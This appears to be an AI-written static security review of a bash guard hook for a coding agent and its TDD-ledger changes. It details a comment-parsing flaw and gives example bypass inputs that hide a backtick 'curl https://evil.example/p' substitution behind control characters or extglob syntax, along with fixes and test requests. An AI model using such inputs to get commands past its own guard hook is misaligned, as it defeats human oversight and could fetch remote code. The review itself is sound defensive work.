findings.title: Comment heuristic treats '#' after non-blank whitespace or after ')' or '|' as a comment, hiding a live backtick substitution
findings.reason:
Lines 265-266 break the scan when '#' follows any [[:space:];|&()] character. Bash only starts a comment at the start of a word, and its word delimiters are space, tab, newline and the metacharacters. Two cases differ.
(1) Vertical tab, form feed or carriage return. POSIX [[:space:]] matches these, but bash treats them as ordinary word characters. Input (JSON \u000b is a vertical tab): `echo a<VT>#x; \`curl https://evil.example/p\``. Bash reads `a<VT>#x` as one word and `;` ends the command, so the substitution runs. The awk takes '#' as a comment and discards the rest of the line. payloads stays empty and ambiguous stays 0, so the mode is 'parsed'. The awk reads the raw `$cmd`; only `cmd_normalized` is tr-squeezed. After quote stripping and splitting on ';', no deny_patterns entry matches (there is no pipe-to-shell), so the hook exits 0. The baseline raw regex `` `[^`]*(curl|wget|fetch) `` denied this input, so it contradicts AC-19's 'previously blocked ... remain blocked'.
(2) Extglob. With `shopt -s extglob` on a previous line, `echo @(a)#x; \`curl https://evil.example/p\`` and `echo @(a|#b); \`curl ...\`` keep '#' inside the word, but the awk sees ')' or '|' before '#' and stops scanning. This is the same hole as the previously fixed escaped-separator case, reached through different characters. The new tests at pre-bash-guard-literals.sh:283-285 cover only backslash-escaped separators.
Fix: start a comment only at line start or after a space, tab or ';'. For '#' after any other character in the set (VT, FF, CR, '(', ')', '|', '&'), set ambiguous=1 so the original raw matcher runs. Alternatively skip the break and keep scanning, which is conservative. Add deny cases for VT/FF/CR and for the extglob forms.

limitations: Static review only. I executed nothing and make no claim that any test passes. Self-reported counts (145 cases, 32 suite cases) were not re-run. I hand-counted the 32 in the T130 report against tdd-ledger-suite.sh and they reconcile.

I traced the awk tokenizer by hand against GNU bash tokenization. The finding's VT/FF/CR claim relies on POSIX [[:space:]] in the awk. Behavior may differ between awk implementations (BWK, mawk, gawk) and with locales. I did not verify how the Bash tool delivers control characters. Claude Code may run commands in zsh, and zsh word splitting and comment rules were not analysed.

Prior findings re-verified against the current sources. The escaped-character-before-'#' hole is fixed by the unconditional ambiguous=1 on backslash (line 248). Wrapped single-quoted network payloads are now denied (lines 215-234). The frontend mask is broadened (line 153). The 32768-character parser bound is added (line 146). The CSI strip is widened (tdd-ledger.sh:85). The 'Error: expect' plus config-frame case is documented as conservative tooling in comments, the test name and the report, so I treat it as a documented unsupported profile, not a bug. The state file verdict is now PENDING_REVIEW.

Deliberate conservative false positives, not defects, in the documented profile: any single-quoted text containing a backtick pair with curl/wget/fetch is denied (for example a commit message `git commit -m 'use `fetch` helper'`, which the test literal-network-data-only encodes); `export async function`, `export default function`, arrow callbacks and `.then(() => fetch(...))` frontend lines are not masked; `export const x = `fetching ...`` does not get the 'fetching' mask. Optional broader redesign: replace the hand-rolled awk bash tokenizer with a real shell parser, or deny any backtick substitution whose payload cannot be parsed.

The 32768 cap is measured in shell characters, not bytes, and bounds only the added parser. Overall large-input latency is the pre-existing residual the brief describes. I make no hook timeout or fail-open claim.

Not assessed, outside my scope: SARIF jq/helpers, workflows, localcollector integrity, evidence collectors. I did not review consumers of .claude/state/analyze-003.json. The removal of the `date` key and the new PENDING_REVIEW verdict value could affect a consumer that expects a fixed enum or schema, and I could not check that.

Authorization for the hook repair is taken from the brief. Bypass logs, live activation and runtime hash-scope facts cannot be verified from the supplied text. The spec/plan `updated` frontmatter still says 2026-10-16 although corrections are dated 2026-10-17. This is cosmetic.
review_summary: Static, tool-free review of the guard and TDD-ledger corrections. I executed nothing and claim no test results. The TDD-ledger change is sound. The ECMA-48 CSI strip `s#ESC\\[[0-?]*[ -/]*[@-~]##g` is correct and the delimiter is safe. It is used for classification only, a failed sed still fails closed, and the original output is preserved. The suite's case tables are internally consistent. The 'Error: expect' plus config-frame limitation is explicitly documented. The pre-bash-guard.sh corrections close the previously reported escaped-character-before-'#' hole, the wrapped and written single-quoted payload gap, and the oversized parser input. The four frontend statement contexts are also covered. One concrete defect remains in the same class as the earlier high finding. The comment-start test at line 265 accepts any [[:space:]] character, including vertical tab, form feed and carriage return, which bash treats as ordinary word characters. It also accepts ')' and '|', which matter under extglob. A live backtick network payload after such a '#' is hidden from the tokenizer. The mode stays 'parsed' and no other check matches, so the hook allows an input the baseline raw regex denied. The new tests cover only backslash-escaped separators, not these characters. Changes requested: make '#' a comment only after space, tab, ';' or line start, and set ambiguous=1 otherwise, with deny tests added. Everything else I traced fails closed or is a documented conservative false positive.
